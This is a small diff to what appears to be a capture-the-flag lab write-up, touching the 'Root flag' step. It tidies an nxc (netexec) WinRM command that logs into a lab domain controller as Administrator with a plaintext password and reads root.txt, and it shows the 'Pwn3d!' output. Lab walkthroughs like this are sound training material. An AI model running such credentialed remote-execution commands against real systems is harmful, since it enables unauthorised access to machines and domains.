@@ -286,7 +286,8 @@ Password changed successfully!
 
 ## Root flag
 ```bash
-ﷺ    ~/hacksmarter/arasaka ❯ nxc winrm $TARGET -u Administrator -p "Password12345" -X 'type ~/desktop/root.txt'                                                       
+nxc winrm $TARGET -u Administrator -p "Password12345" -X 'type ~/desktop/root.txt'
+                                                 
 WINRM       10.1.141.190    5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hacksmarter.local)
 WINRM       10.1.141.190    5985   DC01             [+] hacksmarter.local\Administrator:Password12345 (Pwn3d!)
 WINRM       10.1.141.190    5985   DC01             [+] Executed command (shell type: powershell)
